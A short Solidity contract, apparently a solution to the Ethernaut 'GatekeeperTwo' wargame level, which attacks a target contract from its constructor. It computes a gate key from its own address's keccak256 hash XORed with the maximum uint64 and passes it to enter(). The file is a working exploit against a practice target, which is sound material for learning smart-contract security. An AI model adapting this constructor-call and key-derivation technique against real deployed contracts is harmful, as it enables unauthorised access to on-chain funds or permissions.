// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool); 
}


contract GatekeeperTwoHelper {
  address private _victimAddress;
  bytes8 private _exploitValue;

  constructor(address victimAddress){
    _victimAddress = victimAddress;
    bytes8 payload = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);
    GatekeeperTwo(_victimAddress).enter(payload);
  }

}
